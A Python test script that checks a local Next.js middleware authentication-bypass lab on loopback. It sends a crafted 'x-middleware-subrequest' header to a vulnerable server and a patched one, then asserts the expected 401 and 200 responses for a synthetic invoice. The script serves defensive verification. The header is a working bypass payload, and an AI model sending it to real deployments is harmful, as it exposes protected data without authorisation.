"""check the owned next.js auth bypass lab on loopback only."""

import json
import time
import urllib.error
import urllib.request


header = "middleware:middleware:middleware:middleware:middleware"
invoice = {
    "id": "inv_a",
    "tenant": "a",
    "amount_minor": 1299,
    "currency": "usd",
    "synthetic": True,
}


def get(port, headers=None):
    request = urllib.request.Request(
        f"http://127.0.0.1:{port}/api/vault", headers=headers or {}
    )
    for attempt in range(20):
        try:
            with urllib.request.urlopen(request, timeout=3) as response:
                return response.status, json.load(response)
        except urllib.error.HTTPError as response:
            return response.code, json.load(response)
        except (ConnectionError, TimeoutError, urllib.error.URLError):
            if attempt == 19:
                raise
            time.sleep(0.5)


def main():
    observed = {
        "vulnerable_plain": get(3111),
        "vulnerable_header": get(3111, {"x-middleware-subrequest": header}),
        "patched_plain": get(3112),
        "patched_header": get(3112, {"x-middleware-subrequest": header}),
        "patched_authorized": get(3112, {"x-demo-auth": "a"}),
    }
    expected = {
        "vulnerable_plain": (401, {"error": "synthetic invoice auth required"}),
        "vulnerable_header": (200, invoice),
        "patched_plain": (401, {"error": "synthetic invoice auth required"}),
        "patched_header": (401, {"error": "synthetic invoice auth required"}),
        "patched_authorized": (200, invoice),
    }
    print(json.dumps({name: {"status": status, "body": body} for name, (status, body) in observed.items()}, indent=2))
    assert observed == expected, "owned lab did not match expected advisory behavior"


if __name__ == "__main__":
    main()
